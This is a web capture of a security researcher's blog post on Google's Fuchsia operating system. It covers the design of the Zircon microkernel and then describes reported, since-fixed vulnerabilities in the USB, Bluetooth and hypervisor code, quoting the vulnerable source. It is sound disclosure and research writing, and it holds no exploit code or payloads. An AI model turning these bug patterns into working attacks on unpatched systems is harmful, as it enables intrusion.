@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>
+Playing Around With The Fuchsia Operating System - linksfor.dev(s)    </title>
+    <meta charset="utf-8">
+    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="google" value="notranslate">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <meta property="og:title" content="Playing Around With The Fuchsia Operating System - linksfor.dev(s)"/>
+    <meta property="article:author" content="Fred Raynal"/>
+    <meta property="og:description" content="A look at the new Fuchsia Operating System."/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html"/>
+
+<meta property="og:site_name" content="linksfor.dev(s)" />
+</head>
+<body>
+    <div class="devring" style="background: #222">
+        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
+        <div class="grid">
+            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
+                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
+                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
+                <a href="https://devring.club/random" class="devring-random">Random</a>
+                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
+            </div>
+        </div>
+    </div>
+    <div class="grid">
+        <h1>
+<a href="/" style="color:inherit">linksfor.dev(s)</a>
+        </h1>
+        <title>linksfor.dev(s) - Playing Around With The Fuchsia Operating System</title>
+<div class="readable">
+        <h1>Playing Around With The Fuchsia Operating System</h1>
+            <div>by Fred Raynal</div>
+            <div>Reading time: 28-35 minutes</div>
+        <div>Posted here: 09 Jun 2020</div>
+        <p><a href="https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html">https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html</a></p>
+        <hr/>
+<div id="readability-page-1" class="page"><div>
+
+        <!--/.well -->
+
+        <div>
+<section id="content">
+<article>
+<header>
+
+</header>
+<div>
+  
+
+  <p>A look at the new Fuchsia Operating System.</p>
+
+  <div id="introduction">
+<h2>Introduction</h2>
+<p><a href="https://fuchsia.dev/">Fuchsia</a> is a new operating system developed by Google,
+targeting the AArch64 and x86_64 architectures. While little is known about the
+purpose of this OS and where it will be used, it seems plausible that it aims at
+replacing Android on smartphones and Chrome OS on laptops.</p>
+<p>In the interest of acquiring knowledge on an OS that could possibly run on
+millions of devices in the future, we decided to give a quick look at Fuchsia,
+learn about its inner design, security properties, strengths and weaknesses,
+and find ways to attack it.</p>
+</div>
+
+<div id="monolithic-kernels-vs-micro-kernels">
+<h2>Monolithic kernels vs. micro kernels</h2>
+<p>The most common form of kernel design today is <strong>monolithic kernels</strong>. For
+example, the Linux and BSD kernels are all monolithic, and being based on Linux,
+the Android and Chrome OS kernels are monolithic as well.</p>
+<p>A monolithic kernel is typically very big, embeds all device drivers and network
+stacks, has hundreds of syscalls, and simply said provides all system
+functionalities.</p>
+<p>The inner design of monolithic kernels varies from kernel to kernel, but overall
+the following internals tend to be common:</p>
+<p><img alt="" src="https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png"></p><p>One clear security problem of monolithic kernels is that any vulnerability in an
+internal system component will affect all of the kernel. Suppose, in the schema
+above, that the USB driver has an exploitable memory corruption: since the
+driver runs within the kernel space, an attacker that exploits this vulnerability
+gains control of all of the kernel.</p>
+<p>Fuchsia is not based on a monolithic kernel, but rather on a <strong>micro kernel</strong>.</p>
+<p>A micro kernel is a type of kernel designed to be very small, as its name
+indicates, implementing only a limited number of core features, such as
+scheduling, exception handling, memory management, a few device drivers (if
+needed) and a few syscalls. The rest of the components are moved to userland,
+and are not part of the kernel.</p>
+<p>Example of micro kernel design:</p>
+<p><img alt="" src="https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/micro.png"></p><p>Here the VFS layer, socket layer, networks stacks, file systems and device
+drivers are moved to userland in dedicated user processes, which communicate
+between one another via IPCs.</p>
+<p>For example, an FTP client may fetch data from the network and store it in a
+USB key only by communicating with other userland processes, without any
+intervention by the kernel. The kernel only ensures privilege separation and
+isolation of the processes.</p>
+<p>This micro kernel design has interesting security properties. Suppose once again
+that there is a vulnerability in the USB driver; in this case, an attacker will
+be able to take control of the USB driver process running in userland (<strong>Sys Process 6</strong>),
+but will then be bound to this very process with no opportunity to immediately
+run with wider privileges, whether they be kernel privileges, or privileges of
+other processes (the FTP client for instance).</p>
+<p>The attacker must therefore exploit additional vulnerabilities to move laterally,
+which is a strong security improvement compared to monolithic kernels.</p>
+</div>
+<div id="the-zircon-micro-kernel">
+<h2>The Zircon micro kernel</h2>
+<p>Fuchsia's micro kernel is called Zircon. It is written in <tt>C++</tt>. We describe
+here some relevant internals of this kernel.</p>
+<div id="components">
+<h3>Components</h3>
+<p>The system is organised in <strong>components</strong> which run in userland. The network
+stack, for example, is a component that runs in userland. The USB drivers, too,
+are components that run in userland.</p>
+<p>The components interact with one another via IPCs, the interfaces of which we
+won't discuss here.</p>
+<p><img alt="" src="https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/components.png"></p><p>There is no strict programming language requirements for components: they can be
+written in <tt>C++</tt>, <tt>Rust</tt>, <tt>Go</tt>, or other, and interact via IPCs without
+problems. For example, the USB drivers are written in <tt>C++</tt>, and the network
+stack is instead coded in <tt>Rust</tt>.</p>
+<p>When it comes to device drivers, they get folded together in processes called
+<strong>devhosts</strong>. A devhost is a process that contains several layers of a driver
+stack. For example:</p>
+<p><img alt="" src="https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/devhosts.png"></p><p>There are three devhosts here. The <strong>Devhost Process 3</strong> for example contains
+the AHCI driver, the SATA driver, and the <em>MinFS</em> and <em>BlobFS</em> file systems.
+All of these components live within the same process.</p>
+<p>This kind of weakens the segmentation model because now several components are
+actually part of the same process, so a vulnerability in one component will
+affect the other components of the process too. However, it appears that
+devhosts are organized in a way that only a single device stack can be in a
+process, typically implying that it's not possible to have the USB driver and
+the SATA driver in the same devhost. Therefore, the benefits of the segmentation
+model hold.</p>
+</div>
+<div id="process-isolation">
+<h3>Process isolation</h3>
+<p>Zircon protects its memory and that of the processes by using the CPU's <em>MMU</em>
+(<a href="https://en.wikipedia.org/wiki/Memory_management_unit">Memory Management Unit</a>),
+in a manner that is typical of modern OSes: each process has an address space,
+and this address space is context-switched by Zircon.</p>
+<p>Contrary to other OSes however, the <em>IOMMU</em>
+(<a href="https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit">Input-Output MMU</a>),
+plays an important role on Zircon: it is programmed by the kernel so that each
+devhost process can perform DMA operations only on its own address space and
+not outside.</p>
+<p>The IOMMU is therefore as important as the MMU to ensure process isolation,
+because without it, a devhost process could simply perform DMA operations
+against the kernel pages and overwrite their contents.</p>
+<p>Additionally, on x86, the <em>TSS I/O Bitmap</em>
+(<a href="https://en.wikipedia.org/wiki/Task_state_segment">Task State Segment</a>) is
+used to limit access to I/O ports, in a way that is not relevant to discuss
+here.</p>
+</div>
+<div id="namespaces">
+<h3>Namespaces</h3>
+<p>In Fuchsia, there is no "unified" filesystem visible by user processes. Each
+process has its own virtual filesystem, called a <strong>namespace</strong>. The namespace
+contains <strong>objects</strong>, which can be files, services, devices. These objects are
+ordered in a hierarchy, and accessible using file paths with the usual POSIX
+functions such as <tt>open()</tt>.</p>
+<p>Several paths are of interest. One is the directory <tt>/svc/</tt>, which contains
+service objects, for instance <tt>/svc/fuchsia.hardware.usb.device</tt>; these are
+typically objects on which IPCs can be performed. That is to say, one component
+can expose IPCs via a service object in <tt>/svc/</tt>, and other components can
+access these IPCs by accessing this service object in their respective
+namespaces.</p>
+<p>The namespace is created along with the process when it spawns. It is possible
+to use a <strong>manifest</strong> file to dictate which paths/objects will be present within
+the namespace hierarchy, thereby providing a sandboxing mechanism that limits
+which IPCs a process will be able to access.</p>
+<p>It is to be noted that the notion of namespace lives within the user processes,
+but not in the kernel. It can be seen as a convenient, easy-to-use interface
+for developers to handle objects; but the reality is that the kernel has no
+understanding of the namespace, of its hierarchy, and of its objects. The only
+thing the kernel is aware of, is <strong>handles</strong>.</p>
+</div>
+<div id="handles">
+<h3>Handles</h3>
+<p>Zircon manages accesses to components via <strong>handles</strong>, which can be seen as
+<em>file descriptors</em> on Unix, or general access tokens.</p>
+<p>Without going into boring details, the objects in the namespace are basically
+backed by handles, and a <em>path</em> in the namespace actually corresponds to a
+handle. Again, the kernel doesn't know anything about the namespaces and their
+objects, it only knows about handles. Namespaces live in userland and can be
+seen as big user-friendly wrappers around handles.</p>
+<p>Handles have a <strong>kind</strong> and a <strong>right</strong>. The Zircon syscalls, for the vast
+majority, depend on handles to manage access rights. To access certain classes
+of syscalls, a handle must be of the right <em>kind</em>, and to do specific operations
+with a syscall, the handle must also have the right <em>right</em>.</p>
+<p>It is to be noted that the kernel has no understanding of the notion of <strong>user</strong>,
+contrary to Unix systems.</p>
+<p>Everything comes down to the notion of handle, and that's what we are mainly
+interested in from a security point of view: attackers will typically try to
+obtain better handles than the ones they have.</p>
+</div>
+<div id="syscalls">
+<h3>Syscalls</h3>
+<p>Although not always up-to-date, the <a href="https://fuchsia.dev/fuchsia-src/reference/syscalls">official documentation</a>
+is rather clear, and nothing particular needs to be highlighted. It shows which
+handles are required to perform which classes of syscalls.</p>
+</div>
+<div id="mitigations-and-security-practices">
+<h3>Mitigations and security practices</h3>
+<p>In terms of mitigations, Fuchsia uses <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> (mandatory for userland),
+<a href="https://en.wikipedia.org/wiki/W%5EX">DEP</a>, <a href="https://clang.llvm.org/docs/SafeStack.html">SafeStack</a>,
+<a href="https://clang.llvm.org/docs/ShadowCallStack.html">ShadowCallStack</a>,
+<a href="https://reviews.llvm.org/D54604">AutoVarInit</a>. The Zircon kernel is
+compiled with all of that by default.</p>
+<p>When it comes to security practices, it can be noted in the Fuchsia code that
+a lot of (all?) components have associated unit tests and fuzzers. The fuzzing
+is done via <a href="https://llvm.org/docs/LibFuzzer.html">libfuzzer</a> to fuzz internal
+structures within components, and via <a href="https://github.com/google/syzkaller">syzkaller</a>
+to fuzz the user-exposed syscalls. There is also support for the
+<a href="https://clang.llvm.org/docs/AddressSanitizer.html">ASan</a> and
+<a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">UBSan</a> sanitizers,
+however no <a href="https://clang.llvm.org/docs/MemorySanitizer.html">MSan</a> or
+<a href="https://clang.llvm.org/docs/ThreadSanitizer.html">TSan</a> support seems
+to be present.</p>
+<p>Finally when it comes to programming languages, as said earlier, the components
+can be written in <tt>C++</tt>, <tt>Go</tt>, <tt>Rust</tt>. Arguably the language most prone to
+programming errors used here is <tt>C++</tt>. For <tt>C++</tt> code, the components
+usually override several operators to perform sanity checks; for example, the
+<tt>[]</tt> operator (used when accessing arrays) is often overloaded to make
+sure that the index is in the range of the array and doesn't overflow or
+underflow. Therefore, even on "error-prone" languages, some security measures
+are proactively put in place.</p>
+</div>
+</div>
+<div id="where-we-at">
+<h2>Where we at?</h2>
+<p>Let's sum up the design aspects so far from the security point of view:</p>
+<ul>
+<li>Fuchsia uses a micro kernel whose attack surface is limited by nature: few
+entry points, less complex logic.</li>
+<li>The system is organized in components which run in userland. This brings good
+segmentation properties: a vulnerability that affects a component compromises
+only its process.</li>
+<li>The components can actually be written in safe languages such as <tt>Rust</tt>,
+in which several classes of vulnerabilities simply do not exist.</li>
+<li>The components have their own virtual filesystem that can be sandboxed and
+that lives entirely on the user side. The kernel knows nothing about it.</li>
+<li>Access to components and syscalls is based on handles, which act as the only
+tokens the kernel knows about. They are abstracted as objects in the namespace.</li>
+<li>The mitigations provided by default in the kernel are rather good as of this
+writing.</li>
+<li>The components and kernel are fuzzed and unit-tested in a seemingly systematic
+manner.</li>
+</ul>
+<p>So what can we say about security in Fuchsia? Overall, its kernel design is
+inherently safer than Linux's, and the mitigations and security practices around
+it are better than those currently adopted in Linux.</p>
+<p>Two negative points can be noted:</p>
+<ul>
+<li>Fuchsia doesn't (yet?) support the <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">CFI</a>
+and <a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">PAC</a>
+mitigations. The latter is known to be strong.</li>
+<li>The fact that devhosts combine several components within one process weakens
+the segmentation model a bit when it comes to device drivers.</li>
+</ul>
+</div>
+<div id="attacking-fuchsia">
+<h2>Attacking Fuchsia</h2>
+<p>Contrary to every other major OS, it appears rather difficult to target the
+Zircon kernel directly. A successful RCE (<em>Remote Code Execution</em>) on the world-facing parts of the
+system (USB, Bluetooth, network stack, etc) will only give you control over the
+targeted components, but they run in independent userland processes, not in the
+kernel. From a component, you then need to escalate privileges to the kernel
+using the limited number of syscalls you can access with the handles you have.
+Overall, it seems easier to target other components rather than the kernel, and
+to focus on components that you can talk to via IPC and that you know have
+interesting handles.</p>
+<p>For fun, we decided to do some vulnerability research in some parts of the
+system, to see how far we could go in limited time, and see whether the overall
+good security properties of Fuchsia really lived up to their promises.</p>
+<p>The issues listed below were all reported to Google, and have now been fixed.</p>
+<div id="usb-stack">
+<h3>USB stack</h3>
+<div id="out-of-bounds-access">
+<h4>Out-of-bounds access</h4>
+<p>When attaching a USB device to the machine, Fuchsia will fetch <em>descriptor tables</em>
+from the device as part of the USB enumeration process. This is done by a
+component in the USB devhost. The component actually has a bug when handling
+<em>configuration descriptor tables</em>:</p>
+<div><pre><span></span><span>// read configuration descriptor header to determine size</span>
+<span>usb_configuration_descriptor_t</span> <span>config_desc_header</span><span>;</span>
+<span>size_t</span> <span>actual</span><span>;</span>
+<span>status</span> <span>=</span> <span>GetDescriptor</span><span>(</span><span>USB_DT_CONFIG</span><span>,</span> <span>config</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>config_desc_header</span><span>,</span>
+                       <span>sizeof</span><span>(</span><span>config_desc_header</span><span>),</span> <span>&amp;</span><span>actual</span><span>);</span>
+<span>if</span> <span>(</span><span>status</span> <span>==</span> <span>ZX_OK</span> <span>&amp;&amp;</span> <span>actual</span> <span>!=</span> <span>sizeof</span><span>(</span><span>config_desc_header</span><span>))</span> <span>{</span>
+  <span>status</span> <span>=</span> <span>ZX_ERR_IO</span><span>;</span>
+<span>}</span>
+<span>if</span> <span>(</span><span>status</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
+  <span>zxlogf</span><span>(</span><span>ERROR</span><span>,</span> <span>"%s: GetDescriptor(USB_DT_CONFIG) failed</span><span>
+</span><span>"</span><span>,</span> <span>__func__</span><span>);</span>
+  <span>return</span> <span>status</span><span>;</span>
+<span>}</span>
+<span>uint16_t</span> <span>config_desc_size</span> <span>=</span> <span>letoh16</span><span>(</span><span>config_desc_header</span><span>.</span><span>wTotalLength</span><span>);</span>
+<span>auto</span><span>*</span> <span>config_desc</span> <span>=</span> <span>new</span> <span>(</span><span>&amp;</span><span>ac</span><span>)</span> <span>uint8_t</span><span>[</span><span>config_desc_size</span><span>];</span>
+<span>if</span> <span>(</span><span>!</span><span>ac</span><span>.</span><span>check</span><span>())</span> <span>{</span>
+  <span>return</span> <span>ZX_ERR_NO_MEMORY</span><span>;</span>
+<span>}</span>
+<span>config_descs_</span><span>[</span><span>config</span><span>].</span><span>reset</span><span>(</span><span>config_desc</span><span>,</span> <span>config_desc_size</span><span>);</span>
+
+<span>// read full configuration descriptor</span>
+<span>status</span> <span>=</span> <span>GetDescriptor</span><span>(</span><span>USB_DT_CONFIG</span><span>,</span> <span>config</span><span>,</span> <span>0</span><span>,</span> <span>config_desc</span><span>,</span> <span>config_desc_size</span><span>,</span> <span>&amp;</span><span>actual</span><span>);</span>
+<span>if</span> <span>(</span><span>status</span> <span>==</span> <span>ZX_OK</span> <span>&amp;&amp;</span> <span>actual</span> <span>!=</span> <span>config_desc_size</span><span>)</span> <span>{</span>
+  <span>status</span> <span>=</span> <span>ZX_ERR_IO</span><span>;</span>
+<span>}</span>
+<span>if</span> <span>(</span><span>status</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
+  <span>zxlogf</span><span>(</span><span>ERROR</span><span>,</span> <span>"%s: GetDescriptor(USB_DT_CONFIG) failed</span><span>
+</span><span>"</span><span>,</span> <span>__func__</span><span>);</span>
+  <span>return</span> <span>status</span><span>;</span>
+<span>}</span>
+</pre></div>
+<p>Let's see what's going on here. First, the component fetches the <tt>config_desc_header</tt>
+structure, which has a fixed size; then, it reads the <tt>wTotalLength</tt> field of the structure,
+allocates a buffer of this size, and then re-fetches the table this time
+retrieving the full amount of data.</p>
+<p>Later in the USB stack, the <tt>wTotalLength</tt> value is trusted as being the total
+size of the structure, which kind of makes sense here.</p>
+<p>The problem is, between the first fetch and the second fetch the USB device
+could have modified the <tt>wTotalLength</tt> value. In fact, after the second fetch,
+<tt>wTotalLength</tt> could be bigger than the initial value; in that case the rest
+of the USB stack will still trust it, and will perform out-of-bounds accesses.</p>
+<p>As a reminder, the USB stack runs in userland and not in the kernel, so it's not
+a kernel bug.</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/fd872ce1d485f9a2ee2793aa2e113f84352d5794">[usb-device] Verify wTotalLength sanity</a>.</p>
+</div>
+<div id="stack-overflow">
+<h4>Stack overflow</h4>
+<p>While navigating through the USB code, we noticed a function that had an apparent
+stack overflow:</p>
+<div><pre><span></span><span>zx_status_t</span> <span>HidDevice</span><span>::</span><span>HidDeviceGetReport</span><span>(</span><span>hid_report_type_t</span> <span>rpt_type</span><span>,</span> <span>uint8_t</span> <span>rpt_id</span><span>,</span>
+                                          <span>uint8_t</span><span>*</span> <span>out_report_data</span><span>,</span> <span>size_t</span> <span>report_count</span><span>,</span>
+                                          <span>size_t</span><span>*</span> <span>out_report_actual</span><span>)</span> <span>{</span>
+  <span>input_report_size_t</span> <span>needed</span> <span>=</span> <span>GetReportSizeById</span><span>(</span><span>rpt_id</span><span>,</span> <span>static_cast</span><span>&lt;</span><span>ReportType</span><span>&gt;</span><span>(</span><span>rpt_type</span><span>));</span>
+  <span>if</span> <span>(</span><span>needed</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
+    <span>return</span> <span>ZX_ERR_NOT_FOUND</span><span>;</span>
+  <span>}</span>
+  <span>if</span> <span>(</span><span>needed</span> <span>&gt;</span> <span>report_count</span><span>)</span> <span>{</span>
+    <span>return</span> <span>ZX_ERR_BUFFER_TOO_SMALL</span><span>;</span>
+  <span>}</span>
+
+  <span>uint8_t</span> <span>report</span><span>[</span><span>HID_MAX_REPORT_LEN</span><span>];</span>
+  <span>size_t</span> <span>actual</span> <span>=</span> <span>0</span><span>;</span>
+  <span>zx_status_t</span> <span>status</span> <span>=</span> <span>hidbus_</span><span>.</span><span>GetReport</span><span>(</span><span>rpt_type</span><span>,</span> <span>rpt_id</span><span>,</span> <span>report</span><span>,</span> <span>needed</span><span>,</span> <span>&amp;</span><span>actual</span><span>);</span>
+  <span>/* ... */</span>
+<span>}</span>
+</pre></div>
+<p>In short, the <tt>GetReportSizeById()</tt> function returns a 16-bit value previously
+obtained from the USB device. <tt>HID_MAX_REPORT_LEN</tt> has the value <tt>8192</tt>. Here,
+the call to <tt>GetReport()</tt> can overflow the <tt>report</tt> array with USB-controllable
+data.</p>
+<p>It appears that there is no relevant user of this function that could make it
+USB-triggerable, so it's a bit of an uninteresting bug. Note also that with the
+<a href="https://clang.llvm.org/docs/SafeStack.html">SafeStack</a> mitigation, the <tt>report</tt> array is actually in the <em>unsafe stack</em>,
+which means that overflowing it will not allow the attacker to overwrite the
+return instruction pointer.</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/ba8bd54cda59bb55e62a390b7fd0bcafcc72c034">[hid] Fix GetReport buffer overrun</a>.</p>
+</div>
+</div>
+<div id="bluetooth-stack">
+<h3>Bluetooth stack</h3>
+<div id="l2cap-reject-packets">
+<h4>L2CAP: <tt>reject</tt> packets</h4>
+<p>To handle <tt>reject</tt> packets, the <a href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Logical_link_control_and_adaptation_protocol_(L2CAP)">L2CAP</a>
+protocol uses this piece of code:</p>
+<div><pre><span></span><span>ResponseT</span> <span>rsp</span><span>(</span><span>status</span><span>);</span>
+<span>if</span> <span>(</span><span>status</span> <span>==</span> <span>Status</span><span>::</span><span>kReject</span><span>)</span> <span>{</span>
+  <span>if</span> <span>(</span><span>!</span><span>rsp</span><span>.</span><span>ParseReject</span><span>(</span><span>rsp_payload</span><span>))</span> <span>{</span>
+    <span>bt_log</span><span>(</span><span>TRACE</span><span>,</span> <span>"l2cap"</span><span>,</span> <span>"cmd: ignoring malformed Command Reject, size %zu"</span><span>,</span>
+           <span>rsp_payload</span><span>.</span><span>size</span><span>());</span>
+    <span>return</span> <span>ResponseHandlerAction</span><span>::</span><span>kCompleteOutboundTransaction</span><span>;</span>
+  <span>}</span>
+  <span>return</span> <span>InvokeResponseCallback</span><span>(</span><span>&amp;</span><span>rsp_cb</span><span>,</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>rsp</span><span>));</span>
+<span>}</span>
+</pre></div>
+<p>The <tt>ParseReject()</tt> method gets called with <tt>rsp_payload</tt>, which contains
+the received packet, of an arbitrary size. The method is implemented as follows:</p>
+<div><pre><span></span><span>bool</span> <span>CommandHandler</span><span>::</span><span>Response</span><span>::</span><span>ParseReject</span><span>(</span><span>const</span> <span>ByteBuffer</span><span>&amp;</span> <span>rej_payload_buf</span><span>)</span> <span>{</span>
+  <span>auto</span><span>&amp;</span> <span>rej_payload</span> <span>=</span> <span>rej_payload_buf</span><span>.</span><span>As</span><span>&lt;</span><span>CommandRejectPayload</span><span>&gt;</span><span>();</span>
+  <span>reject_reason_</span> <span>=</span> <span>static_cast</span><span>&lt;</span><span>RejectReason</span><span>&gt;</span><span>(</span><span>letoh16</span><span>(</span><span>rej_payload</span><span>.</span><span>reason</span><span>));</span>
+  <span>/* ... */</span>
+<span>}</span>
+</pre></div>
+<p>Here the payload is suddenly treated as a <tt>CommandRejectPayload</tt> structure,
+with no apparent length check. This could be an out-of-bounds access, but in fact
+the <tt>.As&lt;&gt;</tt> directive automatically performs the length check:</p>
+<div><pre><span></span><span>// Converts the underlying buffer to the given type with bounds checking. The buffer is allowed</span>
+<span>// to be larger than T. The user is responsible for checking that the first sizeof(T) bytes</span>
+<span>// represents a valid instance of T.</span>
+<span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
+<span>const</span> <span>T</span><span>&amp;</span> <span>As</span><span>()</span> <span>const</span> <span>{</span>
+  <span>// std::is_trivial_v would be a stronger guarantee that the buffer contains a valid T object,</span>
+  <span>// but would disallow casting to types that have useful constructors, which might instead cause</span>
+  <span>// uninitialized field(s) bugs for data encoding/decoding structs.</span>
+  <span>static_assert</span><span>(</span><span>std</span><span>::</span><span>is_trivially_copyable_v</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span> <span>"Can not reinterpret bytes"</span><span>);</span>
+  <span>ZX_ASSERT</span><span>(</span><span>size</span><span>()</span> <span>&gt;=</span> <span>sizeof</span><span>(</span><span>T</span><span>));</span>
+  <span>return</span> <span>*</span><span>reinterpret_cast</span><span>&lt;</span><span>const</span> <span>T</span><span>*&gt;</span><span>(</span><span>data</span><span>());</span>
+<span>}</span>
+</pre></div>
+<p>The out-of-bounds access will cause the assert to fire, which will kill the
+Bluetooth component.</p>
+<p>Therefore, this is only a DoS (<em>Denial Of Service</em>) of the Bluetooth component
+and not an interesting bug from an exploitation point of view, (un)fortunately.</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/342a6fe56dc30e8a9a992b13ca31c3bfe954e93a">[bt][l2cap] Check size of command reject payload</a>.</p>
+</div>
+<div id="sdp-servicesearchresponse">
+<h4>SDP: ServiceSearchResponse</h4>
+<p>When parsing ServiceSearchResponse packets, the
+<a href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Service_discovery_protocol_(SDP)">SDP</a>
+protocol invokes the <tt><span>ServiceSearchResponse::Parse()</span></tt> function which has the
+following code:</p>
+<div><pre><span></span><span>Status</span> <span>ServiceSearchResponse</span><span>::</span><span>Parse</span><span>(</span><span>const</span> <span>ByteBuffer</span><span>&amp;</span> <span>buf</span><span>)</span> <span>{</span>
+  <span>/* ... */</span>
+  <span>if</span> <span>(</span><span>buf</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>2</span> <span>*</span> <span>sizeof</span><span>(</span><span>uint16_t</span><span>)))</span> <span>{</span>
+    <span>bt_log</span><span>(</span><span>SPEW</span><span>,</span> <span>"sdp"</span><span>,</span> <span>"Packet too small to parse"</span><span>);</span>
+    <span>return</span> <span>Status</span><span>(</span><span>HostError</span><span>::</span><span>kPacketMalformed</span><span>);</span>
+  <span>}</span>
+  <span>/* ... */</span>
+  <span>size_t</span> <span>read_size</span> <span>=</span> <span>sizeof</span><span>(</span><span>uint16_t</span><span>);</span>
+  <span>/* ... */</span>
+  <span>uint16_t</span> <span>record_count</span> <span>=</span> <span>betoh16</span><span>(</span><span>buf</span><span>.</span><span>view</span><span>(</span><span>read_size</span><span>).</span><span>As</span><span>&lt;</span><span>uint16_t</span><span>&gt;</span><span>());</span>
+  <span>read_size</span> <span>+=</span> <span>sizeof</span><span>(</span><span>uint16_t</span><span>);</span>
+  <span>if</span> <span>((</span><span>buf</span><span>.</span><span>size</span><span>()</span> <span>-</span> <span>read_size</span> <span>-</span> <span>sizeof</span><span>(</span><span>uint8_t</span><span>))</span> <span>&lt;</span> <span>(</span><span>sizeof</span><span>(</span><span>ServiceHandle</span><span>)</span> <span>*</span> <span>record_count</span><span>))</span> <span>{</span>
+    <span>bt_log</span><span>(</span><span>SPEW</span><span>,</span> <span>"sdp"</span><span>,</span> <span>"Packet too small for %d records"</span><span>,</span> <span>record_count</span><span>);</span>
+    <span>return</span> <span>Status</span><span>(</span><span>HostError</span><span>::</span><span>kPacketMalformed</span><span>);</span>
+  <span>}</span>
+  <span>for</span> <span>(</span><span>uint16_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>record_count</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
+    <span>auto</span> <span>view</span> <span>=</span> <span>buf</span><span>.</span><span>view</span><span>(</span><span>read_size</span> <span>+</span> <span>i</span> <span>*</span> <span>sizeof</span><span>(</span><span>ServiceHandle</span><span>));</span>
+    <span>service_record_handle_list_</span><span>.</span><span>emplace_back</span><span>(</span><span>betoh32</span><span>(</span><span>view</span><span>.</span><span>As</span><span>&lt;</span><span>uint32_t</span><span>&gt;</span><span>()));</span>
+  <span>}</span>
+  <span>/* ... */</span>
+<span>}</span>
+</pre></div>
+<p>The bug is rather clear here: <tt>buf.size() - read_size</tt> can be equal to zero,
+and in that case, the whole unsigned expression <tt>(buf.size() - read_size - sizeof(uint8_t))</tt>
+wraps and becomes positive, meaning that the length check succeeds.</p>
+<p>The code then iterates and performs out-of-bounds accesses... Except that once
+again, some constructions are used:</p>
+<div><pre><span></span><span>const</span> <span>BufferView</span> <span>ByteBuffer</span><span>::</span><span>view</span><span>(</span><span>size_t</span> <span>pos</span><span>,</span> <span>size_t</span> <span>size</span><span>)</span> <span>const</span> <span>{</span>
+  <span>ZX_ASSERT_MSG</span><span>(</span><span>pos</span> <span>&lt;=</span> <span>this</span><span>-&gt;</span><span>size</span><span>(),</span> <span>"invalid offset (pos = %zu)"</span><span>,</span> <span>pos</span><span>);</span>
+  <span>return</span> <span>BufferView</span><span>(</span><span>data</span><span>()</span> <span>+</span> <span>pos</span><span>,</span> <span>std</span><span>::</span><span>min</span><span>(</span><span>size</span><span>,</span> <span>this</span><span>-&gt;</span><span>size</span><span>()</span> <span>-</span> <span>pos</span><span>));</span>
+<span>}</span>
+</pre></div>
+<p>The <tt>view()</tt> method catches out-of-bounds accesses. So again, this is only a
+DoS of the Bluetooth component, not interesting! :'(</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/3c2f2ca62114b840520a92f6bf25332725e09d73">[bt][sdp] Fix buffer size check, max response size</a>.</p>
+</div>
+</div>
+<div id="hypervisor-vmcall-bug">
+<h3>Hypervisor <tt>vmcall</tt> bug</h3>
+<p>Fuchsia comes with an embedded hypervisor for both AArch64 and x86_64. It is
+not completely clear why this hypervisor is present; possibly, to facilitate the
+transition to Fuchsia, by having a guest Android or Chrome OS system run in a VM
+and execute Android or Chrome OS applications.</p>
+<p>On x86, we noticed a bug in the handling of the <tt>vmcall</tt> instruction VMEXITs.</p>
+<p>The hypervisor implements a <em>pvclock</em> service on <tt>vmcall</tt>. With this service,
+the guest kernel can ask the time to the hypervisor, by executing the <tt>vmcall</tt>
+instruction with a <em>guest physical address</em> (GPA) as argument. The hypervisor
+writes the time structure into the given GPA in memory.</p>
+<p>However, the <tt>vmcall</tt> instruction is actually legal in the guest userland, and the
+hypervisor does not verify that the <tt>vmcall</tt> came from the guest kernel. Therefore,
+the guest userland can just execute <tt>vmcall</tt> with whatever GPA and have
+the guest kernel memory be overwritten.</p>
+<p>This can be used in privilege escalations from the guest userland to the guest kernel.
+Once in the guest kernel, the attacker has more hypervisor interfaces available,
+and from there a VM escape vulnerability can be researched and leveraged.</p>
